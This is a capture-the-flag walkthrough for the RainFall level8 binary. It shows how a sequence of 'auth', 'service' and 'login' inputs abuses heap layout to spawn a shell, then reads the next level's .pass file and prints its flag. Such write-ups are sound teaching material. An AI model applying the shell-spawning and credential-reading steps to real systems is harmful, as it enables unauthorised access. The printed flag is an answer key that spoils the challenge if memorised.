##  Description

This level is a bit more complex in the code analysis, but the solution is actually very simple and does not require a complex payload or anything.

Before we look at the disassembly, we can execute the program and see how it behaves:
```
level8@RainFall:~$ ./level8
(nil), (nil) 
```

It seems to print two null pointers via printf, then prompts us for input. After some tries with different inputs, we can't see any difference, so let's look at the disassembly to understand what's going on.

The main function starts by calling `printf` with the format string `"%s, %s \n"`, and two arguments that are both null pointers at the beginning of the runtime. This is why we see `(nil), (nil)`.

After that, it calls `fgets` to read user input into a buffer. The buffer is located at `0x804a060`, and it can hold up to 0x80 (128) bytes of input.

The input is then processed in comparison with some other strings, like 'auth', 'service' or 'login'. If the input matches one of these strings, it will allocate memory with `malloc` and store the pointer in the same location where the null pointers were stored before (the ones printed by `printf`).

This shows if we try the program again with the input we have discovered:

```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
service
(nil), 0x804a008 
auth level8
0x804a018, 0x804a008 
auth level8
```

We can see that when we input 'service', the second pointer is updated to point to a new memory location. When we input 'auth <argument>', the first pointer is updated to point to a new memory location.

The trick here is to input 'auth <argument>' once, then input 'service' twice before finally inputting 'login'.

This will cause the program to execute a `system("/bin/sh")` call, giving us a shell. From there, we can read the .pass file to get the flag for the next level.

```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
auth aaaa
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

The solution for this level was quick to find as I was playing around with the program, but it took me a bit longer to actually understand what happens. The thing is that the program does a pseudo verification here:

```c
if ((auth + 32) != NULL) {
	system("/bin/sh");
}
```

This makes no sense, unless the source code was using a structure, which would mean that `auth + 32` was actually something like `data->authenticated`. But the same could be achieved without a structure, just having the two buffers next to each other in memory.

Calling the service pseudo function in this shell triggers a `strdup()`. Even though we strdup an empty string, malloc still maps some headers before the actual buffer, in this case calling service twice is enough to set the word at *(auth+32) to 0x0000000a, which passes the check and triggers the shell:

```bash
(gdb) x/32wx 0x0804a008 <  @auth
0x804a008:      0x61616161      0x0000000a      0x00000000      0x00000011
0x804a018:      0x0000000a      0x00000000      0x00000000      0x00000011
0x804a028:      0x0000000a      0x00000000      0x00000000      0x00020fd1
				^ *(auth + 32) is now populated with a malloc header
0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a068:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a078:      0x00000000      0x00000000      0x00000000      0x00000000
```
